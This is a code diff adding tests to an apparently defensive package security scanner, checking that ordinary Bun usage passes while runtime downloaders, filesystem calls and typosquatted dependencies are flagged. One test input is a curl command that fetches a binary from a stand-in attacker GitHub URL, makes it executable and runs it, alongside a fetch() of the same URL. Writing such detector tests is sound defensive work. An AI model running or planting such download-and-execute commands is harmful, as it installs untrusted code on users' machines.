@@ -30,6 +30,38 @@ async function listFixtureFiles(root: string, dir: string): Promise<string[]> {
 }
 
 describe('SecurityScanner adversarial evals', () => {
+  it('does not block ordinary Bun usage, module names, or release URLs without a downloader', async () => {
+    for (const [name, content] of [
+      ['pnpm-lock.yaml', 'packages:\n  is-bun-module@2.0.0:\n    resolution: {integrity: sha512-placeholder}\n'],
+      ['yarn.lock', 'is-bun-module@^2.0.0:\n  version "2.0.0"\n'],
+      ['package.json', JSON.stringify({ name: 'example', repository: 'https://github.com/o/r', dependencies: { 'is-bun-module': '^2.0.0' }, scripts: { dev: 'bun run dev' } })],
+      ['server.ts', 'const server = Bun.serve({ port: 3000 });\n// See https://github.com/o/r/releases/download/v1/notes.txt\nconst filename = "execution.js";'],
+      ['pnpm-lock.yaml', await readFile(path.join(process.cwd(), 'pnpm-lock.yaml'), 'utf8')],
+    ]) {
+      const result = await scan({ name, path: name, content });
+      assert.equal(result.riskLevel, 'pass', `${name}: ${JSON.stringify(result.findings)}`);
+      assert.equal(result.severityCounts.critical, 0);
+      assert.ok(!result.findings.some(f => f.category === 'Runtime Downloader'));
+    }
+  });
+
+  it('still blocks runtime download commands followed by executable installation', async () => {
+    const content = 'curl -L https://github.com/attacker/runtime/releases/download/v1/bun-linux-x64 -o /tmp/bun && chmod +x /tmp/bun && /tmp/bun execution.js';
+    for (const name of ['install', 'index.js', 'reference.md']) {
+      const result = await scan({ name, path: name, content });
+      assert.equal(result.riskLevel, 'block');
+      assert.ok(result.findings.some(f => f.category === 'Runtime Downloader' && f.severity === 'critical'));
+    }
+    const fetched = await scan({ name: 'install.js', path: 'install.js', content: 'const runtime = await fetch("https://github.com/attacker/runtime/releases/download/v1/bun-linux-x64");' });
+    assert.equal(fetched.riskLevel, 'block');
+    assert.ok(fetched.findings.some(f => f.category === 'Runtime Downloader'));
+  });
+
+  it('still detects actual filesystem calls rather than package-name substrings', async () => {
+    const result = await scan({ name: 'index.js', path: 'index.js', content: 'fs.stat("./data");\nfs.readFileSync("./data");' });
+    assert.equal(result.findings.filter(f => f.category === 'File System Access').length, 2);
+  });
+
   it('blocks every committed malicious fixture', async () => {
     const fixtureDir = path.join(process.cwd(), 'test/fixtures/malicious');
     const names = await listFixtureFiles(fixtureDir, fixtureDir);
@@ -269,6 +301,19 @@ Never fetch preset codes manually. Use the CLI and review generated files.
 
     assert.equal(result.riskLevel, 'review');
     assert.ok(result.findings.some(f => f.category === 'Registry Freshness'));
+  });
+
+  it('separates family packages from typosquats in dependencies', async () => {
+    const manifest = (name: string, dependencies: Record<string, string>) => ({
+      name: 'package.json', path: 'package.json', content: JSON.stringify({ name, version: '1.0.0', dependencies }),
+    });
+    const family = await scan(manifest('eslint', { 'eslint-scope': '^8.0.0', '@eslint-community/eslint-utils': '^4.0.0', 'eslint-visitor-keys': '^4.0.0', '@eslint/eslintrc': '^3.0.0' }));
+    assert.equal(family.findings.filter(finding => finding.category === 'Package Dependencies').length, 0);
+
+    const squat = await scan(manifest('my-app', { 'expresss': '^4.0.0', 'lodashh': '^4.0.0' }));
+    assert.equal(squat.findings.filter(finding => finding.category === 'Package Dependencies').length, 0, 'unrelated names are not compared');
+    const nearMiss = await scan(manifest('chalk', { 'chalkk': '^1.0.0' }));
+    assert.equal(nearMiss.findings.filter(finding => finding.category === 'Package Dependencies').length, 1);
   });
 
   it('does not flag pinned read-only GitHub Actions workflows', async () => {
